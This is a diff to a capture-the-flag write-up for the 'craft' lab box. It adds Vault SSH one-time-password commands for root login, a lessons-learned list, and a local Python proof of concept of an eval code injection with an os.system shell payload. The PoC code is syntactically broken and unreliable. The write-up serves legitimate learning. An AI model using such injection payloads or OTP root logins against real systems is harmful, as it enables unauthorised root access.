@@ -210,32 +210,65 @@ This repo was a gold mine of information. I downloaded the repo. In the `.ssh` f
 
 ### Privesc
 
-In the private repo ther is a folder named vault that has information regarding the use of the (not suprisingly named) [Vault](https://www.vaultproject.io/docs/) app. Vault keeps your secrets safe; not so much when the mechanics hiding those secrets are availible to unintended users.
+In the private repo ther is a folder named `vault` that has information regarding the use of the (not suprisingly named) [Vault](https://www.vaultproject.io/docs/) app. Vault keeps your secrets safe; not so much when the mechanics hiding those secrets are availible to unintended users.
 
 The `secrets.sh` script enables root login using `ssh` via one time password (OTP). In reading the [documentation](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html), it looks like if this backdoor is enabled all you have to do is `ssh` into the box using `root` and the OTP.
 
 From the `gilfoyle` ssh session, I tried
 
 ```bash
+vault list ssh/roles/
+```
+to see if the `root_otp` role was implemented as mentioned in `secrets.sh`. The role was there, so I ran
+
+```bash
 ssh -role root -mode otp root@10.10.10.110
 ```
 
-and was able to log in as root. From there `root.txt` was pillaged and the box was done!
+and was able to log in as root. From there I found `root.txt` in the current working directory and the box was done!
 
 ![Screenshot from 2019-08-08 22-10-03](https://user-images.githubusercontent.com/46615118/62894522-77e3f580-bd12-11e9-9406-0f1122c47d55.jpg)
 
-
 ~fin!
 
-### Lessons Learned
-- learned a lot about modules, packages, and `import` in python. This was nice.
-- settings.py
-- sql - prolly a better query
-- ssh -i
-- secrets.sh
-- I read almost every bit of code in this project looking for ways to leak data. It helped out a ton.
+### Lessons Learned and Further Questions
+
+- I read almost every bit of code in this project looking for ways to leak data. It helped out a ton. ENUMERATE, my friends!
+- Not being able to use python everyday, I (re)learned a lot about modules, packages, and `__import__` in python. This was nice.
+- I mentioned earlier that I thought that `settings.py` was going to be integral in solving this box, but it pretty much wasn't for me. If anyone else was able to use it, or if I'm missing something obvious (which is highly likely) please let me know.
+- My sql ... there is probably a better query out there that would list all of the creds other than `dinesh`. I'll test locally for sure, but am interested to see other people's queries. If not, why was only one row returned at a time? I am unable to understand the reason if it exists in the flask or sqlalchemy code.
+- I ssh every day. However I rarely have to use keys to auth. Learning about `ssh -i` was great.
 - I am starting to develop a good methodology for note-taking. A bit of refining is needed, but I like how I can organize data in CherryTree and print out to pdf for a nice report.
 
 <img width="540" alt="Screen Shot 2019-08-09 at 9 18 23 AM" src="https://user-images.githubusercontent.com/46615118/62785900-283dc980-ba87-11e9-8fec-4ace2403efbf.png">
 <img width="540" alt="Screen Shot 2019-08-09 at 9 19 04 AM" src="https://user-images.githubusercontent.com/46615118/62785901-283dc980-ba87-11e9-815c-fdb39dbce1af.png">
 
+### Local PoC for the reverse shell
+
+Here is the "proof of concept" I developed locally on my machine to give me an idea of what I should try feed to Dinesh's `eval` function in order to get the reverse shell on `craft`. I understand that the local environment should be as identical as possible to the target environment in order for this to be a good test, but I think this was a nice excersise for me to see how something like this would work. 
+
+```python
+#!/usr/bin/python
+
+# when prompted, enter: __import__("os").system("/bin/sh/")
+
+def post(self):
+    """
+    Creates a new brew entry
+    """
+    
+    # make sure the ABV value is sane.
+    
+    if (eval('%s >1' %self):
+        return (eval('%s >1' %self) # failure
+    else:
+        return "PoC || gtfo", 201 # you should get a shell
+        
+def get_input():
+    print post(raw_input('Prompt: '))
+    
+if __name__ == '__main__':
+    get_input()
+```
+
+As always, constructive criticism is appreciated and desired!
